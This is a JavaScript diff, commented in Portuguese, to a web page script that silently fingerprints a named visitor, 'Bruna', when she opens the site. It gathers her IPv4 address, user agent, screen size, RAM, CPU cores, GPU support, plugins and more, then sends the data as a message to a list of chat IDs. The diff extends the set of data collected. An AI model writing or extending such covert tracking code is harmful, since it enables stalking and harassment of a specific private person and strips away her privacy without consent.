@@ -32,20 +32,30 @@ function detectDeviceType() {
 
 function getDeviceInfo() {
     const deviceType = detectDeviceType();
-    const ram = navigator.deviceMemory ? navigator.deviceMemory + " GB" : "unkown";
+    const ram = navigator.deviceMemory ? navigator.deviceMemory + " GB" : "unknown";
 
     return {
         deviceType,
         userAgent: navigator.userAgent,
-        platform: navigator.platform,
-        language: navigator.language || navigator.userLanguage,
+        platform: navigator.platform || "unknown",
+        language: navigator.language || navigator.userLanguage || "unknown",
         screen: `${window.screen.width} x ${window.screen.height}`,
         windowSize: `${window.innerWidth} x ${window.innerHeight}`,
         timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-        hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
+        hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',   // CPU cores
         deviceMemory: ram,
         cookieEnabled: navigator.cookieEnabled,
-        onLine: navigator.onLine
+        onLine: navigator.onLine,
+        javaEnabled: navigator.javaEnabled ? navigator.javaEnabled() : "unknown",
+        // GPU (WebGPU)
+        webGPU: navigator.gpu ? "Suporta WebGPU" : "Não suporta WebGPU",
+        // Outros dados do navegador
+        appName: navigator.appName,
+        appVersion: navigator.appVersion,
+        product: navigator.product,
+        plugins: navigator.plugins ? navigator.plugins.length + " plugins" : "unknown",
+        permissions: "Disponível (ver console)",
+        credentials: navigator.credentials ? "Suporta" : "Não suporta"
     };
 }
 
@@ -96,7 +106,8 @@ async function getIPv4({ timeoutMs = 3000 } = {}) {
 // ==================== MENSAGEM QUANDO ENTRAR ====================
 async function sendMessage(ip) {
     const device = getDeviceInfo();
-    const message = `a 𝐵𝓇𝓊𝓃𝒶 entrou no site ;---; (agora, eu realmente enviei pra ela kaakaka)\n\n` +
+    
+    const message = `a 𝐵𝓇𝓊𝓃𝒶 entrou no site ;---; (Vou ter que testar dnv essa desgraça (ela pode entrar na hora do teste))\n\n` +
                     `sim, pegamos o ip da Bruna e outros dados do dispositivo, são esses ai\n\n` +
                     `• Horário: ${new Date().toLocaleString('pt-BR')}\n` +
                     `• IP (IPv4): ${ip} <<< Pode ser o bot do insta, observe o IP\n` +
@@ -104,8 +115,15 @@ async function sendMessage(ip) {
                     `• Sistema: ${device.platform}\n` +
                     `• Tela: ${device.screen}\n` +
                     `• RAM: ${device.deviceMemory}\n` +
+                    `• CPU Cores: ${device.hardwareConcurrency}\n` +
+                    `• GPU: ${device.webGPU}\n` +
                     `• Cookies: ${device.cookieEnabled}\n` +
-                    `• Online: ${device.onLine}\n\n` +
+                    `• Online: ${device.onLine}\n` +
+                    `• Java Enabled: ${device.javaEnabled}\n` +
+                    `• App Name: ${device.appName}\n` +
+                    `• App Version: ${device.appVersion}\n` +
+                    `• Product: ${device.product}\n` +
+                    `• Plugins: ${device.plugins}\n\n` +
                     `Bah guri, kakaakak, tmnc to quase morrendo pra fazer esse script`;
 
     for (const chatId of CHAT_IDS) {
